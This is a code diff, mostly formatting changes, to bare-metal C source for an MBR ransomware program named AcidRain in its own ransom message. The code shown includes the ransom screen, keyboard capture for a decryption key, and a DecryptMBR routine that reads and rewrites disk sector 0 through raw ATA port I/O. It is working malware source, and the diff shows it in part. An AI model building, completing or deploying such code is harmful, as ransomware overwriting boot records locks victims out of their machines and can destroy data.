@@ -122,7 +122,7 @@ void DecryptMBR();
 void _start()
 {
 	ClearScreen(VGA_COLOR_BLACK);
-	
+
 	//Sleep(150000000);
 
 	while (inb(KBD_STATUS_PORT) & 0x01) //Empty keyboard status port
@@ -131,7 +131,7 @@ void _start()
 	}
 
 
-	while(1)
+	while (1)
 	{
 
 		Stage1(1);
@@ -144,10 +144,10 @@ void _start()
 		{
 			//uint8_t scancode = inb(KBD_DATA_PORT);
 			break;
-		
+
 		}
 	}
-	
+
 
 	Stage2();
 
@@ -174,7 +174,7 @@ void outb(uint16_t port, uint8_t data)
 }
 
 // Simple I/O port write function (word)
-uint16_t inw(uint16_t port) 
+uint16_t inw(uint16_t port)
 {
 	uint16_t data;
 	asm volatile ("inw %1, %0" : "=a"(data) : "Nd"(port));
@@ -214,9 +214,9 @@ void ClearScreen(enum color color)
 }
 
 
-void Sleep(uint32_t cycles) 
+void Sleep(uint32_t cycles)
 {
-	while (cycles--) 
+	while (cycles--)
 	{
 		__asm__ volatile ("nop");
 	}
@@ -236,7 +236,7 @@ void SetCursorPos(int x, int y)
 }
 
 
-void itoa(int num, char* str) 
+void itoa(int num, char* str)
 {
 	int i = 0;
 	int isNegative = 0;
@@ -280,7 +280,7 @@ void itoa(int num, char* str)
 }
 
 
-void byteToHexStr(uint8_t byte, char* str) 
+void byteToHexStr(uint8_t byte, char* str)
 {
 	const char hexChars[] = "0123456789ABCDEF";  // Hexadecimal characters
 	str[0] = hexChars[(byte >> 4) & 0x0F];      // Upper nibble
@@ -318,7 +318,7 @@ uint8_t GetKeyPress()
 
 uint8_t AsciiToScancode(uint8_t keypress)
 {
-	
+
 	return scancodeMapping[keypress];
 
 }
@@ -376,9 +376,9 @@ void Stage1(int col)
 		SetCursorPos(0, 25);
 
 	}
-	else if(col == 2) //brown bg
+	else if (col == 2) //brown bg
 	{
-		
+
 		ClearScreen(VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
 
 
@@ -408,7 +408,7 @@ void Stage2()
 
 
 	Print("Your computer has been taken over by AcidRain ransomware!", 0, 0, VGA_COLOR_BROWN);
-	
+
 	for (int i = 0; i < VGA_WIDTH; i++)
 	{
 		*addr = ' ';
@@ -427,10 +427,10 @@ void Stage2()
 
 	SetCursorPos(cursorPosX, 24);
 
-	char keyBuffer[256] = {0};
+	char keyBuffer[256] = { 0 };
 	int charCount = 0;
 
-	
+
 
 	//Sleep(100000000);
 
@@ -539,7 +539,7 @@ void Stage3()
 void DecryptMBR()
 {
 
-	uint8_t buffer[512] = {0};
+	uint8_t buffer[512] = { 0 };
 
 	//master drive
 	outb(ATA_DRIVE, 0xE0);
@@ -569,7 +569,7 @@ void DecryptMBR()
 		Sleep(9000000);
 
 		uint16_t data = inw(ATA_DATA);
-		
+
 		buffer[i] = (uint8_t)(data & 0xFF);				// Lower byte
 		buffer[i + 1] = (uint8_t)((data >> 8) & 0xFF);  // Upper byte
 
@@ -606,8 +606,8 @@ void DecryptMBR()
 			}
 
 		}
-		
-		
+
+
 		//master drive
 		outb(ATA_DRIVE, 0xE0);
 
@@ -621,13 +621,13 @@ void DecryptMBR()
 
 		//send write command
 		outb(ATA_COMMAND, ATA_CMD_WRITE);
-		
+
 		while (inb(ATA_STATUS) & 0x80);  // Wait for busy flag to clear
 		while (!(inb(ATA_STATUS) & 0x40));  // Wait for ready flag
 
 
 		uint16_t* buf16 = (uint16_t*)buffer;
-		for (int i = 0; i < 256; i++) 
+		for (int i = 0; i < 256; i++)
 		{
 			outw(ATA_DATA, buf16[i]);  // Write word (2 bytes) to ATA data register
 		}
